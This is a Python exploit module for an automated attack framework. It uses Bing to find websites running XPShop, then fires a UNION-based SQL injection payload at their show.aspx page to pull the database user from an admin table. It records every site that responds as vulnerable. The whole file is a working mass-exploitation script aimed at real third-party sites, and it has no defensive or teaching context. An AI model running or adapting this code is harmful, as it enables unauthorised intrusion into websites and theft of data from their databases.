#!/usr/bin/env python
# -*- coding: utf-8 -*-

from auto_exp.lib.core.exploit.base_class import AEFbase
import re
import requests

class AEF(AEFbase):
	def __init__(self):
		super(self.__class__, self).__init__()
		self.info = {
			"Type" : self.type.injection ,
			"Level" : self.level.high,
			"Author" : "HackBoy",
			"Desc" : "XPShop SQL injection",
			"Name" : "xpshop_sql",
			"Version" : "1.0" ,
			"Keyword" : "powered by xpshop" ,
			"Search_Method" : "Bing" ,
		}
	def run(self):
		url_fix ="/show.aspx"
		exp = "/show.aspx?type=1&action=GetImg&pids=1 union select 1,2,CURRENT_USER,4,5 from admin#"
		res = self.search.run_bing(self.info['Keyword'],10)
		for key in res:
			key =  key[:key.find("/",8)]
			if self.__check(key):
				#print key
				try:
					url = key+exp
					a = re.findall(r'.*\"ThumbnailImg\":\"(.*?)\".*',requests.get(url, timeout = 2).content)
					#a += re.findall(r'Error')
					if len(a) > 0:
						self.print_info("URL:"+key+url_fix+" INFO:"+a[0])
						self.db.add_url(key+url_fix,self.info['Name'],a[0])
					else:
						self.print_error("URL:"+key+" INFO: Error Exploit")
				except:
					pass
	def __check(self,url):
		try:
			res = requests.get(url,timeout = 2)
			if res.status_code == requests.codes.ok:
				return True
			else:
				return False
		except:
			return False

if __name__ == "__main__":
	pass